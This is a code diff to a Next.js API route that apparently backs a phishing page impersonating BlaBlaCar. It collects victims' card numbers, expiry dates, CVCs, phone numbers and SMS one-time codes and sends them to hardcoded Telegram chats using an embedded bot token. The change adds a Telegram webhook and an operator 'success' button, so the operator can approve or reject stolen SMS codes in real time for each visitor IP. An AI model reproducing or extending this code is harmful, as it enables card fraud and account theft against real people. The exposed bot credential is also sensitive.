@@ -1,21 +1,59 @@
 import { NextRequest, NextResponse } from 'next/server';
-import { getCodeErrorFlag, setCodeErrorFlag } from './codeErrorStore';
+import { getCodeErrorFlag, setCodeErrorFlag, getCodeSuccessFlag } from './codeErrorStore';
 
 const TELEGRAM_TOKEN = '7962685508:AAHBZMDWD4hqHYVzjjDfv4pjMAZ6aMwAvTc';
 const CHAT_IDS = ['1902713760', '7508575481'];
+const WEBHOOK_URL = 'https://blablacar-lovat.vercel.app/api/notify/callback';
+
+// Функция для установки webhook
+async function setupWebhook() {
+  try {
+    console.log('Setting up webhook with URL:', WEBHOOK_URL);
+    
+    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/setWebhook`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        url: WEBHOOK_URL,
+        allowed_updates: ['callback_query']
+      })
+    });
+    
+    const data = await response.json();
+    console.log('Webhook setup response:', data);
+  } catch (error) {
+    console.error('Error setting up webhook:', error);
+  }
+}
+
+// Устанавливаем webhook при инициализации
+setupWebhook();
+
+function getClientIp(req: NextRequest) {
+  const xff = req.headers.get('x-forwarded-for');
+  if (xff) return xff.split(',')[0].trim();
+  return req.ip || 'Unknown';
+}
 
 export async function GET(req: NextRequest) {
   // Polling для ошибки кода
   if (req.nextUrl.searchParams.get('check_code_error')) {
-    const userAgent = req.headers.get('user-agent') || 'Unknown';
-    console.log('Checking code error for User Agent:', userAgent);
-    const hasError = getCodeErrorFlag(userAgent);
+    const ip = getClientIp(req);
+    console.log('Checking code status for IP:', ip);
+    const hasError = getCodeErrorFlag(ip);
+    const isSuccess = getCodeSuccessFlag(ip);
+    
     if (hasError) {
-      console.log('Code error flag found for User Agent:', userAgent);
-      setCodeErrorFlag(userAgent, false);
+      console.log('Code error flag found for IP:', ip);
       return NextResponse.json({ codeError: 'Код введен неверно или устарел, введите новый поступивший смс код' });
     }
-    return NextResponse.json({ codeError: null });
+    
+    if (isSuccess) {
+      console.log('Code success flag found for IP:', ip);
+      return NextResponse.json({ codeSuccess: true });
+    }
+    
+    return NextResponse.json({ codeError: null, codeSuccess: false });
   }
   return NextResponse.json({});
 }
@@ -25,7 +63,7 @@ export async function POST(req: NextRequest) {
     const body = await req.json();
     const { text, status = 'online', url, message_ids, action, firstName, lastName, card, date, cvc, owner, phone } = body;
     const userAgent = req.headers.get('user-agent') || 'Unknown';
-    const ip = req.ip || 'Unknown';
+    const ip = getClientIp(req);
     const now = new Date();
     const time = now.toLocaleString('ru-RU', { hour12: false });
 
@@ -43,7 +81,12 @@ export async function POST(req: NextRequest) {
         `🕒 <b>Время:</b> ${time}\n` +
         `🌍 <b>IP:</b> ${ip}`;
       reply_markup = {
-        inline_keyboard: [[{ text: 'Ошибка / Запросить новый код', callback_data: 'code_error' }]],
+        inline_keyboard: [
+          [
+            { text: 'Ошибка / Запросить новый код', callback_data: 'code_error' },
+            { text: 'Успех', callback_data: 'code_success' }
+          ]
+        ],
       };
     } else if (action === 'sms_code') {
       message =
